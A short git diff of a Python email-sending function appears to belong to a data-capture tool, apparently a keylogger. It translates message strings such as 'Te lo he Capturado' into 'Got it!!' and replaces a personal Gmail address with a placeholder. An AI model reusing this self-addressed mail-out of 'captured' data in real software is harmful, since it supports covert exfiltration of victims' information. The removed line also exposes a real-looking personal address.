@@ -72,11 +72,11 @@ def enviar_email(nombre):
     password = clave.decrypt((pass_enc)).decode()
 
     msg = MIMEMultipart()
-    mensaje = 'Guarda bien esto!'
+    mensaje = 'Save this!!'
 
-    msg['From'] = 'seandaza@gmail.com'
-    msg['To'] = 'seandaza@gmail.com'
-    msg['Subject'] = 'Te lo he Capturado'
+    msg['From'] = 'youremail@email.com'
+    msg['To'] = 'youremail@email.com'
+    msg['Subject'] = 'Got it!!'
 
     msg.attach(MIMEText(mensaje, 'plain'))
 
